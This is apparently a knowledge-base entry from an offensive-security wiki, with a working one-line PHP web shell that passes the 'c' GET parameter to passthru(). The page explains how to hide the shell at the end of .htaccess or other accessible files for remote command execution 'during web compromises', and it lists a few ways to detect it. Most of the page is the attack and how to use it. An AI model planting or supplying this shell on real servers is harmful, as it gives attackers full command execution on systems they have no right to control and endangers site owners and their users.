---
type: code
language: php
verified: true
tags:
  - web-shell
  - php
  - rce
platforms:
  - Web
  - Apache
validated: true
---

# PHP Passthru Web Shell

## Code

```php
###### SHELL ######
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```

## Description

This PHP code implements a minimal web shell using the passthru() function to execute system commands received via the 'c' GET parameter, outputting results directly to the HTTP response. It redirects stderr to stdout (2>&1) for complete command feedback. Commonly appended to configuration files like .htaccess to enable RCE in restricted environments.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_GET['c'] | Shell command to run on the server | whoami |

## Usage

Embed this code at the end of an accessible file (e.g., after .htaccess directives) on a PHP-enabled server. Invoke by requesting the file URL with ?c=command. Use for quick command execution during web compromises; URL-encode commands with spaces or special chars.

## Detection

- PHP execution logs showing passthru() calls or dynamic command execution.
- HTTP access logs with repeated ?c= queries or encoded shell commands.
- Application-level monitoring for unauthorized PHP in non-script files.
- Behavioral analysis: unusual output lengths in responses to .htaccess accesses.

## Related

- [[procedures/HTAccess-and-PHP-Shell-Upload]]
